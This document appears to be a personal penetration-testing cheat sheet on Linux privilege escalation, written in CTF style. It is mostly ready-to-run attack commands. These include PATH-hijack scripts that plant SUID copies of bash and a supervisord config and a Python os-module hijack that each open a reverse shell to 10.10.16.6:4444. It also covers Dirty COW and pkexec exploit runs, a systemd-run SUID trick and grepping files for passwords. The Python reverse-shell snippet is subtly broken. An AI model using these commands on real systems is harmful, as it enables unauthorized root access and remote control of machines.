---
icon: linux
---

# Linux Privilege Escalation

* ## <mark style="color:purple;">Get your own local version of this checklist</mark> [<mark style="color:orange;">`here`</mark>](https://raw.githubusercontent.com/HackTricks-wiki/hacktricks/refs/heads/master/linux-hardening/linux-privilege-escalation-checklist.md)<mark style="color:purple;">:</mark>

{% embed url="https://book.hacktricks.xyz/linux-hardening/linux-privilege-escalation-checklist" %}
By Carlos Palop
{% endembed %}

* ## <mark style="color:purple;">Make sure you have</mark> <mark style="color:orange;">`pspy`</mark> <mark style="color:purple;">and</mark> <mark style="color:orange;">`linpeas`</mark> <mark style="color:purple;">ready:</mark>

{% embed url="https://github.com/peass-ng/PEASS-ng/blob/master/linPEAS/README.md" %}

{% embed url="https://github.com/DominicBreuker/pspy" %}

***

{% hint style="info" %}
## <mark style="color:orange;">`PATH`</mark> <mark style="color:purple;">Hijacking</mark>

* <mark style="color:purple;">When a script is executed with elevated privileges (e.g., via</mark> <mark style="color:orange;">**`sudo`**</mark> <mark style="color:purple;">or in a</mark> <mark style="color:orange;">**`cron`**</mark> <mark style="color:purple;">job) and calls other binaries or scripts without absolute paths, it may be possible to hijack the execution flow by manipulating the</mark> <mark style="color:orange;">**`PATH`**</mark> <mark style="color:purple;">variable or exploiting relative paths.</mark>

***

### <mark style="color:orange;">`PATH`</mark> <mark style="color:purple;">Hijacking with</mark> <mark style="color:orange;">`sudo`</mark> <mark style="color:purple;">:</mark>

{% code title="Lists allowed commands" %}
```bash
sudo -l
```
{% endcode %}

* <mark style="color:purple;">Sometimes is possible to run scripts as</mark> <mark style="color:orange;">**`sudo`**</mark> <mark style="color:purple;">that call others scripts within the script.</mark>
* <mark style="color:purple;">When this scripts are called by a relative path is possible to create a malicious script on a directory with write permissions.</mark>
* <mark style="color:purple;">This commands creates a script called</mark> <mark style="color:orange;">**`initdb.sh`**</mark> <mark style="color:purple;">that well called will copy</mark> <mark style="color:orange;">**`bash`**</mark> <mark style="color:purple;">to a file called</mark> <mark style="color:purple;"></mark>_<mark style="color:purple;">**shellie**</mark>_ <mark style="color:purple;"></mark><mark style="color:purple;">in the</mark> <mark style="color:orange;">**`/tmp`**</mark> <mark style="color:purple;">folder:</mark>

{% code overflow="wrap" %}
```bash
echo -e '#!/bin/bash\n\ncp /bin/bash /tmp/shellie\nchown root:root /tmp/shellie\nchmod 6777 /tmp/shellie' | tee initdb.sh
```
{% endcode %}

* <mark style="color:purple;">Once the  malicious script is executed by the vulnerable script, you just need to execute the shell from the</mark> <mark style="color:orange;">**`/tmp`**</mark> <mark style="color:purple;">folder to become</mark> <mark style="color:orange;">**`root`**</mark><mark style="color:purple;">:</mark>

```bash
/tmp/shellie -p
```

***

### <mark style="color:purple;">Path Hijacking in</mark> <mark style="color:orange;">`cron`</mark> <mark style="color:purple;">job:</mark>

* <mark style="color:purple;">When</mark> <mark style="color:orange;">**`PATH`**</mark> <mark style="color:purple;">includes</mark> <mark style="color:orange;">**`/usr/local/bin`**</mark> <mark style="color:purple;">before</mark> <mark style="color:orange;">**`/usr/bin`**</mark> <mark style="color:purple;">in the</mark> <mark style="color:orange;">**`cron`**</mark> <mark style="color:purple;">job's environment.</mark>&#x20;
* <mark style="color:purple;">There is an opportunity for</mark> <mark style="color:orange;">**`PATH hijacking`**</mark> <mark style="color:purple;">if a binary or script is executed</mark> <mark style="color:orange;">**`without using an absolute path`**</mark><mark style="color:purple;">**.**</mark>
* <mark style="color:purple;">By placing a malicious binary in a directory earlier in the</mark> <mark style="color:orange;">**`PATH`**</mark> <mark style="color:purple;">(e.g.,</mark> <mark style="color:orange;">**`/usr/local/bin`**</mark><mark style="color:purple;">), you can hijack the execution flow.</mark>

{% code overflow="wrap" %}
```sh
echo -e '#!/bin/bash\n\ncp /bin/bash /bin/shellie\nchmod u+s /bin/shellie' > /usr/local/bin/run-parts; chmod +x /usr/local/bin/run-parts
```
{% endcode %}

* <mark style="color:orange;">**`bash`**</mark> <mark style="color:purple;">drops</mark> <mark style="color:orange;">**`SUID`**</mark> <mark style="color:purple;">privileges by default, so make sure to run it with</mark> <mark style="color:orange;">**`-p`**</mark> <mark style="color:purple;">to keep root:</mark>

```bash
shellie -p
```

***

### <mark style="color:purple;">Path Hijack in</mark> <mark style="color:orange;">`supervisord.pid`</mark> <mark style="color:purple;">:</mark>

* <mark style="color:purple;">Supervisor it’s a process management tool for keeping services running.</mark>
* <mark style="color:purple;">Each managed process must have a</mark> <mark style="color:orange;">**`[program:<name>]`**</mark> <mark style="color:purple;">line followed by another line</mark> <mark style="color:orange;">**`command=`**</mark> <mark style="color:purple;">where you should place the payload:</mark>

{% code overflow="wrap" %}
```bash
echo -e "[program:memcached]\ncommand = bash -c 'bash -i  >& /dev/tcp/10.10.16.6/4444 0>&1'" > memcached.ini
```
{% endcode %}

***

### <mark style="color:green;">`Python`</mark> <mark style="color:purple;">Path Hijacking</mark>

* <mark style="color:purple;">Sometimes python scripts are being executed by</mark> <mark style="color:orange;">**`cron`**</mark> <mark style="color:purple;">jobs or by other scripts with</mark> <mark style="color:orange;">**`sudo`**</mark> <mark style="color:purple;">permissions:</mark>

{% code title="Look for writable modules" overflow="wrap" %}
```bash
find /usr/lib/python* -type f -writable -ls 2>&1 | grep python
```
{% endcode %}

{% code title="Look in virtual environments" overflow="wrap" %}
```bash
find /path/to/venv -type f -writable -ls 2>&1 | grep python
```
{% endcode %}

{% code title="Look in the entire system" overflow="wrap" %}
```bash
find -type f -writable -ls 2>&1 | grep python
```
{% endcode %}

* <mark style="color:purple;">Check the python</mark> <mark style="color:orange;">**`PATH`**</mark> <mark style="color:purple;">order:</mark>

```bash
python -c 'import sys; print "\n".join(sys.path)'
```

* <mark style="color:purple;">Here is a example of a reverse shell to hijack the</mark> <mark style="color:orange;">**`os`**</mark> <mark style="color:purple;">module:</mark>

```bash
echo 'import pty
import socket
s=socket.socket(socket.AF_INET,socket.SOCK_STREAM)
s.connect(("10.10.16.6",4444))
dup2(s.fileno(),0)
dup2(s.fileno(),1)
dup2(s.fileno(),2)
pty.spawn("/bin/bash")
s.close()' >> os.py
```
{% endhint %}

***

{% hint style="danger" %}
## <mark style="color:purple;">Kernel Exploits</mark>

{% code title="Find the kernel version" %}
```bash
uname -r
```
{% endcode %}

### <mark style="color:orange;">`Dirty Cow`</mark>

* #### <mark style="color:purple;">List of</mark> <mark style="color:orange;">`POCs`</mark> [<mark style="color:purple;">here</mark>](https://github.com/dirtycow/dirtycow.github.io/wiki/PoCs)<mark style="color:purple;">.</mark>
* <mark style="color:purple;">**Linux kernel versions**</mark>**&#x20;**<mark style="color:orange;">**`2.6.22`**</mark>**&#x20;**<mark style="color:purple;">**to**</mark>**&#x20;**<mark style="color:orange;">**`4.8.3`**</mark>**&#x20;**<mark style="color:purple;">**(inclusive)**</mark>\
  [<mark style="color:orange;">**`dirty.c`**</mark>](https://github.com/FireFart/dirtycow/blob/master/dirty.c) <mark style="color:purple;">**POC**</mark>

{% code title="Compile it" %}
```bash
gcc -pthread dirty.c -o dirty -lcrypt; chmod +x dirty; ./dirty
```
{% endcode %}

{% code title="Log as firefart" %}
```bash
su firefart
```
{% endcode %}

```bash
ssh firefart@10.10.10.10
```
{% endhint %}















Netstat

```bash
#Option 1
netstat -l

#Ports
netstat -nltp

#More
netstat -rn
```

Look for files

```bash
#SUID
find / -perm -4000 -type f 2>/dev/null
find / -perm -4000 -or -perm -2000 2>/dev/null
#Binaries con capabilities
getcap -r / 2>/dev/null

#Extra info about bin process 
**getfacl** 

#Passwords
grep -iR "pass" *
grep password .*.* -r
#File
grep -ir cri-o . 2>/dev/null

#Look for a specific file
find / -name lcars 2>/dev/null
find / -name root.txt 2>/dev/null

#Inside a file
cat /etc/zabbix/zabbix_server.conf | grep -Ev "^#" | grep .

#Check libraries
ltrace

#Looking for 32 characters file
#hex
grep -aPo '[a-fA-F0-9]{32}' /dev/sdb
#string 32 chars
strings /dev/sdb -n 32
```

User Privileges

```bash
Check user root privileges —> sudo -l
```

Port Forwarding

```bash
ssh -L {TARGETPORT}:127.0.01:8000 [sau@](<mailto:sau@10.10.11.214>){TARGETIP}
```

Symbolic Link

```bash
ln -s /root/root.txt t.trace.db
```

Common Vectors

```bash
#systemd-run + bash -p
systemd-run chmod u+s /bin/bash
bash -p

#pkexec
python3 CVE-2021-4034.py
```

Flash drives

```bash
#Enumerate mounted disks
mount
#more
lsblk
```

SUDO

```bash
#Interective shell
sudo -i
#su vuln
sudo su -
```

